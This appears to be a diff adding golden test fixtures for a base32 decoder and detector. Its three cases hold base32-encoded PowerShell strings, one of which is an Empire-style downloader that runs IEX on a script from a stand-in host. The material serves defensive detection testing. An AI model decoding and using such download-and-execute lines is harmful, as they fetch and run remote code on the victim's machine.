@@ -1,0 +1,5 @@
+# base32-decode · Golden Fixtures · RC3.2a
+# RFC-4648 Base32 (A-Z2-7) + lowercase-tolerant variant.
+{"case_id":"b32-plain-ps","description":"Standard base32 → 'powershell -c IEX'","input":"OBXXOZLSONUGK3DMEAWWGICJIVMA====","detect_min_confidence":0.5,"expected_output_contains":["powershell","-c","IEX"]}
+{"case_id":"b32-lowercase-tolerant","description":"Lowercase base32 alphabet still decodes (analyst copy-paste)","input":"obxxozlsonugk3dmeawwgicjivma====","detect_min_confidence":0.4,"expected_output_contains":["powershell","IEX"]}
+{"case_id":"b32-empire-shape","description":"Empire-shape base32 downloader body","input":"JFCVQKDJO5ZCA2DUORYDULZPMEXGK6DBNVYGYZJPPAXHA4ZRFE======","detect_min_confidence":0.4,"expected_output_contains":["IEX","http://a.example/x.ps1"]}
